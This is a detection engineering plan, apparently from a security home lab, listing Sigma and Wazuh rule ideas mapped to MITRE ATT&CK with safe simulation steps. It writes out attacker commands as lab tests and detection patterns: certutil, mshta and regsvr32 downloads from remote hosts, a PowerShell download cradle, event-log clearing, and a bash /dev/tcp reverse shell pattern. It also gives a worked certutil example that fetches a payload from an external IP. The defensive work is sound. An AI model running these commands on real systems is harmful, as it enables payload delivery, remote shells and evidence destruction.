# 08. Detection Engineering Plan

This is the detection backlog: 20 Sigma rule ideas and 20 Wazuh rule ideas, each mapped to MITRE
ATT&CK, with the log source, a way to safely generate the telemetry, and the first investigation
steps. Four Sigma rules are already implemented (`bf-0001` to `bf-0004`); the rest are the roadmap.

Design principles for every rule:
- One behavior per rule. Small rules are testable and tunable.
- Always case-insensitive on command lines (attackers vary casing to evade).
- Every rule maps to at least one ATT&CK technique.
- Every rule documents at least one false positive and one investigation step.
- Every rule ships with a sample log and a test.

## Part A: 20 Sigma rules (endpoint, mostly Sysmon)

| ID | Title | ATT&CK | Log source / key fields | How to simulate (safe) |
|----|-------|--------|--------------------------|------------------------|
| bf-0001 | PowerShell encoded command | T1059.001 | Sysmon 1: Image, CommandLine | Run `powershell -enc <base64>` in lab |
| bf-0002 | Certutil file download | T1105, T1218 | Sysmon 1: Image=certutil, CommandLine | `certutil -urlcache -f http://lab/x` |
| bf-0003 | Whoami discovery | T1033 | Sysmon 1: Image=whoami | Run `whoami /all` |
| bf-0004 | PowerShell suspicious flags | T1059.001 | Sysmon 1: CommandLine | `powershell -nop -w hidden ...` |
| bf-0005 | Mshta remote script | T1218.005 | Sysmon 1: Image=mshta, CommandLine has http | `mshta http://lab/a.hta` |
| bf-0006 | Rundll32 with URL/JS | T1218.011 | Sysmon 1: Image=rundll32, CommandLine | `rundll32 javascript:...` |
| bf-0007 | Regsvr32 scriptlet (Squiblydoo) | T1218.010 | Sysmon 1: Image=regsvr32, /i:http | `regsvr32 /s /i:http://lab/a.sct scrobj.dll` |
| bf-0008 | LSASS process access | T1003.001 | Sysmon 10: TargetImage=lsass | Run a benign handle-open test |
| bf-0009 | Scheduled task creation | T1053.005 | Sysmon 1: Image=schtasks /create | `schtasks /create ...` |
| bf-0010 | New service via sc.exe | T1543.003 | Sysmon 1: Image=sc.exe create | `sc create demo binpath=...` |
| bf-0011 | Registry Run key persistence | T1547.001 | Sysmon 13: TargetObject has \Run | Add a benign Run value |
| bf-0012 | Office spawning shell | T1566/T1204 | Sysmon 1: Parent=winword, Child=cmd/powershell | Macro that launches cmd |
| bf-0013 | WMImplant / wmic exec | T1047 | Sysmon 1: Image=wmic, "process call create" | `wmic process call create calc` |
| bf-0014 | BITSAdmin transfer | T1197 | Sysmon 1: Image=bitsadmin, /transfer | `bitsadmin /transfer ...` |
| bf-0015 | Clear event log | T1070.001 | Sysmon 1: wevtutil cl / Security 1102 | `wevtutil cl System` |
| bf-0016 | Net user account creation | T1136.001 | Sysmon 1: net user /add | `net user demo /add` |
| bf-0017 | Suspicious parent-child (svchost spawns cmd) | T1055/T1036 | Sysmon 1: Parent/Child mismatch | Custom lab process tree |
| bf-0018 | Encoded + download cradle combo | T1059.001, T1105 | Sysmon 1: CommandLine IEX+DownloadString | PowerShell download cradle |
| bf-0019 | Renamed system binary | T1036.003 | Sysmon 1: OriginalFileName != Image | Copy cmd.exe to a.exe and run |
| bf-0020 | Ngrok / tunneling tool execution | T1572 | Sysmon 1: Image=ngrok | Run ngrok in lab |

## Part B: 20 Wazuh rules (host + correlation + Linux)

Wazuh shines at correlation (many events over time) and at Linux/syslog, which complements the
endpoint-heavy Sigma set.

| ID | Title | ATT&CK | Source / logic |
|----|-------|--------|----------------|
| 100201 | PowerShell encoded command | T1059.001 | Sysmon decoder + commandLine regex |
| 100202 | Certutil download | T1105 | Sysmon: image=certutil + urlcache |
| 100203 | Whoami discovery | T1033 | Sysmon: image=whoami |
| 100210 | SSH brute force | T1110.001 | Correlate 6+ failed sshd in 120s, same src |
| 100211 | SSH success after brute force | T1110/T1078 | Failed burst then accepted from same IP |
| 100212 | New sudoers or sudo to root | T1548.003 | Linux: sudo / visudo activity |
| 100213 | Web shell file drop | T1505.003 | File integrity: new .php in web root |
| 100214 | Cron persistence | T1053.003 | Linux: crontab edits |
| 100215 | New Linux user / passwd change | T1136 | Linux: useradd / passwd |
| 100216 | Reverse shell pattern | T1059.004 | Linux: bash -i >& /dev/tcp |
| 100217 | Package manager abuse | T1072 | apt/yum installing from odd source |
| 100218 | Auditd: execve of nc/ncat | T1095 | Linux auditd execve |
| 100219 | Windows account lockout burst | T1110 | Correlate 4740 events |
| 100220 | Multiple 4625 then 4624 (Win brute) | T1110 | Correlate Windows logon failures then success |
| 100221 | Defender disabled / tamper | T1562.001 | Windows: Defender config change events |
| 100222 | Firewall rule added | T1562.004 | Windows: netsh advfirewall add |
| 100223 | RDP logon from new geo | T1021.001 | 4624 LogonType 10 from unusual IP |
| 100224 | File integrity change in /etc | T1565 | Wazuh FIM on /etc |
| 100225 | Wazuh agent stopped/removed | T1562 | Manager: agent disconnect events |
| 100226 | Mass file modification (ransomware-like) | T1486 | FIM: many changes in short window |

## Attack simulations (safe, reversible, lab only)

Each simulation exists to generate the telemetry a rule needs. All run on the isolated host-only
network against lab VMs, using well-documented, reversible commands (Atomic Red Team style). No
real malware. Snapshot the VM before, restore after.

Priority set for months one and two: encoded PowerShell, certutil download, whoami/discovery
chain, LOLBIN execution (mshta/regsvr32), SSH brute force with hydra against a lab VM, a Linux
reverse shell one-liner, and a Windows brute-force then success.

## Expected logs and investigation steps (worked example)

**Scenario:** certutil download (bf-0002 / Wazuh 100202), T1105.

- **What the attacker does:** `certutil.exe -urlcache -split -f http://45.77.12.9/payload.exe a.exe`
- **Attacker sees:** the file downloaded to disk.
- **Telemetry (Sysmon EventID 1):** Image ends `\certutil.exe`, CommandLine contains `urlcache`
  and an `http` URL, ParentImage is likely `cmd.exe` or `powershell.exe`.
- **Wazuh alert:** rule 100202, level 12, description "Certutil used to download a remote file",
  MITRE T1105, with the source IP available for pivoting.
- **Investigation steps:**
  1. Is certutil expected on this host for this user? On a workstation, almost never for downloads.
  2. Extract the URL and IP; run reputation lookups (public IP, not private).
  3. Check the parent process and what ran after (did the downloaded file execute?).
  4. Look for the written file on disk and hash it; pivot the hash across other hosts.
  5. Decision: if the destination is untrusted and a file executed, contain the host and escalate.
- **What you would say in an interview:** "certutil is a signed Microsoft binary, a LOLBIN, so it
  blends in. I do not detect the tool, I detect the behavior: the download flags plus an external
  URL. That keeps false positives low because legitimate certificate use does not use urlcache
  against an external http host."
